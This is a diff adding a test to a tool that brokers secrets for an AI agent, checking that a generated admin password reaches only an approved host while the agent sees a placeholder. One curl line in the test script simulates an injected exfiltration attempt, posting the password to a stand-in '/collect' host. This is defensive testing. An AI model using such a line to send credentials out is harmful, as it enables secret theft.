@@ -215,3 +215,53 @@ test("Node fetch inside the agent is brokered (NODE_USE_ENV_PROXY)", { skip: !no
   assert.equal(run.stdout.trim(), "200");
   assert.equal(upstream.seen.at(-1).authorization, `Bearer ${GOOD}`);
 });
+
+test("agent provisions an admin with a generated password it never sees", { skip: !hasCurl && "curl not installed" }, async () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "rl-provision-"));
+  const upstream = await startUpstream(dir);
+  fs.writeFileSync(
+    path.join(dir, "rabbitlock.agent.yaml"),
+    "secrets:\n  ADMIN_PASSWORD:\n    hosts: [api.rabbitlock.test]\n",
+  );
+  const baseEnv = Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => !/^(no_proxy|https?_proxy|all_proxy)$/i.test(k) && !k.startsWith("RABBITLOCK_")),
+  );
+  const env = {
+    ...baseEnv,
+    SHELL: "/bin/sh",
+    RABBITLOCK_HOME: path.join(dir, "home"),
+    RABBITLOCK_SEED_HEX: SEED,
+    RABBITLOCK_TEST_UPSTREAM: HOSTS.map((h) => `${h}=127.0.0.1:${upstream.port}`).join(","),
+    RABBITLOCK_TEST_UPSTREAM_CA: upstream.caFile,
+    TEST_UPSTREAM_CA_FILE: upstream.caFile,
+  };
+
+  // The human generates it; the value goes to their "password manager" (a file here).
+  const gen = await runCli(["set", "ADMIN_PASSWORD", "--generate", "--to-command", "cat > vault.txt"], { cwd: dir, env });
+  assert.equal(gen.code, 0, gen.stderr);
+  const password = fs.readFileSync(path.join(dir, "vault.txt"), "utf8").trim();
+
+  // The agent calls the app's setup API with the placeholder.
+  const script = [
+    'c() { curl -s -o /dev/null -w "%{http_code}\\n" "$@"; }',
+    'c -H "Content-Type: application/json" -d "{\\"email\\":\\"admin@example.com\\",\\"password\\":\\"$ADMIN_PASSWORD\\"}" https://api.rabbitlock.test/api/setup',
+    // Any other host (an injected exfiltration attempt, say) is tunneled untouched: it gets the placeholder.
+    'c --cacert "$TEST_UPSTREAM_CA_FILE" -H "Content-Type: application/json" -d "{\\"password\\":\\"$ADMIN_PASSWORD\\"}" https://other.rabbitlock.test/collect',
+    'echo "AGENT_SEES $ADMIN_PASSWORD"',
+  ].join("\n");
+  const run = await runCli(["run", "--quiet", "--", "sh", "-c", script], { cwd: dir, env });
+  upstream.server.close();
+  assert.equal(run.code, 0, run.stderr);
+
+  const [setup, otherHost, seenLine] = run.stdout.trim().split("\n");
+  assert.equal(setup, "200", `stdout: ${run.stdout}\nstderr: ${run.stderr}`);
+  assert.equal(otherHost, "200");
+  assert.match(seenLine, /^AGENT_SEES rl_ph_ADMIN_PASSWORD_[0-9a-f]{32}$/);
+  assert.ok(!run.stdout.includes(password) && !run.stderr.includes(password), "the agent never sees the password");
+
+  const setupReq = upstream.seen.find((r) => r.url === "/api/setup");
+  assert.deepEqual(JSON.parse(setupReq.body), { email: "admin@example.com", password });
+  const placeholder = seenLine.split(" ")[1];
+  const collected = upstream.seen.find((r) => r.url === "/collect");
+  assert.deepEqual(JSON.parse(collected.body), { password: placeholder }, "other hosts only ever get the placeholder");
+});
